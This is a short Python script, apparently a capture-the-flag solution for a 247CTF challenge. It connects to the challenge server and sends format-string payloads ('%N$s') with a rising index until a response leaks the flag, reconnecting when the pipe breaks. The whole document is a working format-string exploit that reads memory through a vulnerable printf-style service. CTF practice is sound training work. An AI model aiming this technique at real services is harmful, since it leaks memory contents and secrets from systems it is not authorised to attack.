import socket

ctf_url = "4a17ee1acbb6aa71.247ctf.com"
ctf_port = 50041

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ctf_url, ctf_port))
flag = ""
cur_index = 0

sock.recv(1024) # Ignore first response #

# Format String Exploit #
try:
	while True:
		print(f"Current Index: {cur_index}")
		exploit = f"%{cur_index}$s\n"
		print(f"Exploit: {exploit}", end="")
		sock.send(exploit.encode())
		data = sock.recv(1024)
		if data == b"": # Avoid Broken Pipe #
			sock.close()
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((ctf_url, ctf_port))
		flag_index = data.find(b"247CTF")
		if flag_index != -1:
			flag = data[flag_index:data.find(b"}") + 1].decode()
			break
		cur_index += 1
except BaseException as e:
	print(f"Unhandled Exception: {e}")
	exit(0)
sock.close()
print(f"FLAG: {flag}")